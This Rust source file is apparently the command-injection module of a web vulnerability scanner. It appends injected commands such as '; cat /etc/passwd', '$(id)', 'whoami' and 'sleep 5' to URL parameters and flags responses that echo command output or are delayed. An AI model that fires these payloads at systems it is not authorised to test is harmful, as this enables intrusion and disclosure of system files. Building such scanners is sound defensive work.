//! Command Injection testing

use anyhow::Result;

use crate::http::{HttpClient, Request};
use crate::scanner::findings::{Finding, Severity};

/// Command injection payloads with expected output patterns
const CMD_PAYLOADS: &[(&str, &str)] = &[
    // Linux payloads
    ("; id", "uid="),
    ("| id", "uid="),
    ("|| id", "uid="),
    ("& id", "uid="),
    ("&& id", "uid="),
    ("`id`", "uid="),
    ("$(id)", "uid="),
    ("; cat /etc/passwd", "root:"),
    ("| cat /etc/passwd", "root:"),
    ("; uname -a", "Linux"),
    ("| uname -a", "Linux"),
    ("$(uname -a)", "Linux"),
    ("; echo vulnerable", "vulnerable"),
    ("| echo vulnerable", "vulnerable"),
    ("$(echo vulnerable)", "vulnerable"),

    // Windows payloads
    ("& dir", "Volume"),
    ("| dir", "Volume"),
    ("& type C:\\Windows\\win.ini", "[fonts]"),
    ("| type C:\\Windows\\win.ini", "[fonts]"),
    ("& echo vulnerable", "vulnerable"),
    ("| echo vulnerable", "vulnerable"),
    ("& whoami", "\\"),
    ("| whoami", "\\"),
];

/// Time-based command injection payloads
const TIME_PAYLOADS: &[(&str, u64)] = &[
    ("; sleep 5", 5),
    ("| sleep 5", 5),
    ("$(sleep 5)", 5),
    ("`sleep 5`", 5),
    ("& ping -c 5 127.0.0.1", 5),
    ("| ping -c 5 127.0.0.1", 5),
    ("& timeout /t 5", 5),  // Windows
];

/// Scan for command injection vulnerabilities
pub async fn scan(client: &HttpClient, target_url: &str) -> Result<Vec<Finding>> {
    let mut findings = Vec::new();

    let url = url::Url::parse(target_url)?;
    let params: Vec<(String, String)> = url.query_pairs()
        .map(|(k, v)| (k.to_string(), v.to_string()))
        .collect();

    if params.is_empty() {
        return Ok(findings);
    }

    // Get baseline response for comparison
    let baseline_request = Request::new("GET", target_url);
    let baseline_response = client.execute(&baseline_request).await?;
    let baseline_body = baseline_response.body_text();

    for (param_name, _) in &params {
        for (payload, indicator) in CMD_PAYLOADS {
            let mut test_url = url.clone();
            {
                let mut pairs = test_url.query_pairs_mut();
                pairs.clear();
                for (k, v) in &params {
                    if k == param_name {
                        pairs.append_pair(k, &format!("{}{}", v, payload));
                    } else {
                        pairs.append_pair(k, v);
                    }
                }
            }

            let request = Request::new("GET", test_url.as_str());
            let response = match client.execute(&request).await {
                Ok(r) => r,
                Err(_) => continue,
            };

            let body = response.body_text();

            // Check if indicator appears in response but not in baseline
            if body.contains(indicator) && !baseline_body.contains(indicator) {
                findings.push(
                    Finding::new("Command Injection", Severity::Critical, target_url)
                        .with_description(&format!(
                            "Command injection vulnerability detected in parameter '{}'. OS command output observed in response.",
                            param_name
                        ))
                        .with_parameter(param_name)
                        .with_evidence(&format!("Payload: {}, Indicator: {}", payload, indicator))
                        .with_scanner("active/command-injection")
                        .with_cwe(78)
                        .with_owasp("A03:2021 – Injection")
                        .with_remediation(
                            "Never pass user input to system commands. Use safe APIs that don't invoke shell. If shell is required, use strict input validation and escaping."
                        )
                        .with_request(&format!("GET {}", test_url)),
                );

                // Found vulnerability, move to next parameter
                break;
            }
        }
    }

    Ok(findings)
}

/// Scan for time-based command injection
pub async fn scan_time_based(
    client: &HttpClient,
    target_url: &str,
) -> Result<Vec<Finding>> {
    let mut findings = Vec::new();

    let url = url::Url::parse(target_url)?;
    let params: Vec<(String, String)> = url.query_pairs()
        .map(|(k, v)| (k.to_string(), v.to_string()))
        .collect();

    if params.is_empty() {
        return Ok(findings);
    }

    for (param_name, _original_value) in &params {
        for (payload, expected_delay) in TIME_PAYLOADS {
            let mut test_url = url.clone();
            {
                let mut pairs = test_url.query_pairs_mut();
                pairs.clear();
                for (k, v) in &params {
                    if k == param_name {
                        pairs.append_pair(k, &format!("{}{}", v, payload));
                    } else {
                        pairs.append_pair(k, v);
                    }
                }
            }

            let request = Request::new("GET", test_url.as_str());
            let start = std::time::Instant::now();

            if let Ok(_response) = client.execute(&request).await {
                let elapsed = start.elapsed();

                // If response took at least as long as expected delay
                if elapsed.as_secs() >= *expected_delay {
                    findings.push(
                        Finding::new(
                            "Time-Based Command Injection",
                            Severity::Critical,
                            target_url,
                        )
                        .with_description(&format!(
                            "Time-based command injection detected in parameter '{}'. Response delayed by {}s (expected {}s).",
                            param_name, elapsed.as_secs(), expected_delay
                        ))
                        .with_parameter(param_name)
                        .with_evidence(&format!("Payload: {}", payload))
                        .with_scanner("active/command-injection-time")
                        .with_cwe(78)
                        .with_owasp("A03:2021 – Injection")
                        .with_remediation(
                            "Never pass user input to system commands."
                        ),
                    );
                    break;
                }
            }
        }
    }

    Ok(findings)
}
